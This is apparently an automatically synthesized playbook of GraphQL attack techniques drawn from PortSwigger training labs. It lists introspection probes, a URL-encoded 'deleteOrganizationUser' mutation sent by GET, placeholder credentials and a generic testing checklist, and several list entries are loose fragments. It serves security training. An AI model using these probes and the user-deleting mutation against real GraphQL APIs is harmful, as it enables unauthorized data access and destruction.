## GRAPHQL Playbook
*Synthesized from 5 PortSwigger labs*

### Overview
This playbook covers 5 known attack techniques for graphql.

### Attack Techniques

**General:**
- Accidental exposure of private GraphQL fields
- Bypassing GraphQL brute force protections
- Performing CSRF exploits over GraphQL
- Finding a hidden GraphQL endpoint
- Accessing private GraphQL posts

### Key Payloads
```
__schema
/api
BlogPost
Content-Type
mutation {}
getUser
postPassword
true
operationName
{
"data": {
"getUser": null
}
}
x-www-form-urlencoded
deleteOrganizationUser
POST /graphql/v1
/api?query=mutation+%7B%0A%09deleteOrganizationUser%28input%3A%7Bid%3A+3%7D%29+%7B%0A%09%09user+%7B%0A%09%09%09id%0A%09%09%7D%0A%09%7D%0A%7D
{
  "data": {
    "__typename": "query"
  }
}
/api?query=query{__typename}
success
[TEST_USER]:[TEST_PASS]
"__schema{"
```

### Indicators of Success
- Unexpected data in response
- Error messages revealing internal info
- Behavior change confirming injection
- Out-of-band callback received
- Access to unauthorized resources

### Testing Methodology
1. **Identify injection points** — forms, parameters, headers, cookies
2. **Test basic payloads** — start simple, escalate complexity
3. **Observe responses** — errors, timing, content changes
4. **Try bypasses** — encoding, alternative syntax, filter evasion
5. **Confirm impact** — data extraction, privilege escalation, RCE

